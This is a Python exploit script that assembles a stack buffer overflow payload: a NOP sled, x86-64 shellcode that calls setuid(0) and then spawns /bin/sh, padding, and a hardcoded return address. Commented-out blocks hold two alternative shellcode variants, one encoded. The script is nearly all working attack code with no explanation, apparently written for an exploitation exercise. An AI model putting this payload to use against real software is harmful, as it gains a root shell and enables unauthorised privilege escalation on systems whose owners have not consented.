import sys

desired_size = 296 + 8

#
# buf =  b""
# buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d"
# buf += b"\x05\xef\xff\xff\xff\x48\xbb\x6d\xdd\x3d\xb9\x14"
# buf += b"\x31\xb0\xa6\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
# buf += b"\xff\xe2\xf4\x07\xf4\x65\x20\x7e\x33\xef\xcc\x6c"
# buf += b"\x83\x32\xbc\x5c\xa6\xf8\x1f\x6f\xdd\x2c\xe5\x6b"
# buf += b"\x31\xb0\xa7\x3c\x95\xb4\x5f\x7e\x21\xea\xcc\x47"
# buf += b"\x85\x32\xbc\x7e\x32\xee\xee\x92\x13\x57\x98\x4c"
# buf += b"\x3e\xb5\xd3\x9b\xb7\x06\xe1\x8d\x79\x0b\x89\x0f"
# buf += b"\xb4\x53\x96\x67\x59\xb0\xf5\x25\x54\xda\xeb\x43"
# buf += b"\x79\x39\x40\x62\xd8\x3d\xb9\x14\x31\xb0\xa6"


# buf = b""
# buf += b"\x31\xf6"              # xor esi, esi
# buf += b"\x56"                  # push rsi
# buf += b"\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"  # mov rbx, '//bin/sh'
# buf += b"\x53"                  # push rbx
# buf += b"\x54"                  # push rsp
# buf += b"\x5f"                  # pop rdi
# buf += b"\xf7\xee"              # imul esi          (clever zeroing trick)
# buf += b"\xb0\x3b"              # mov al, 0x3b
# buf += b"\x0f\x05"              # syscall           (execve)


buf = (
    b"\x48\x31\xff"             # xor rdi, rdi     uid=0
    b"\xb0\x69"                 # mov al, 105      setuid syscall
    b"\x0f\x05"                 # syscall
    b"\x31\xf6"                 # xor esi, esi
    b"\x56"                     # push rsi
    b"\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"  # mov rbx, '//bin/sh'
    b"\x53"                     # push rbx
    b"\x54"                     # push rsp
    b"\x5f"                     # pop rdi
    b"\xf7\xee"                 # imul esi         esi=0
    b"\xb0\x3b"                 # mov al, 0x3b
    b"\x0f\x05"                 # syscall
)

nop_sled = b"\x90" * 200

padding     = b"A" * (desired_size - len(nop_sled) - len(buf) - 8)
# address =  b"\x08\xD4\xFF\xFF\xFF\x7F\x00\x00"
address =  b"\xf0\xd4\xFF\xFF\xFF\x7F\x00\x00"


final_payload = nop_sled + buf + padding + address
assert(len(final_payload) == desired_size)
sys.stdout.buffer.write(final_payload)